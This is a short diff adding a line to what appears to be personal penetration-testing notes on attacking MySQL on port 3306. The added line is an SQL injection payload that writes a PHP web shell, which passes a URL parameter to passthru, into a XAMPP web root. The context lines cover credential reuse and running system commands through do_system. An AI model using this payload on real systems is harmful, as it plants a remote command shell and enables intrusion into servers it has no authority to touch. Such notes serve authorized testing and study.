@@ -48,6 +48,7 @@ MYSQL - Port 3306:
   - Credential reuse to login into mysql and read database users or create a login as well. Also, shell commands can be run as a result.
   - select do_system('id'); //to run system commands from mysql shell.
   - Great resource: https://book.hacktricks.xyz/pentesting/pentesting-mysql 
+  - Incase of sql injection: ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
  
 *RDP - Port 3386:
   - Credential re use to login.
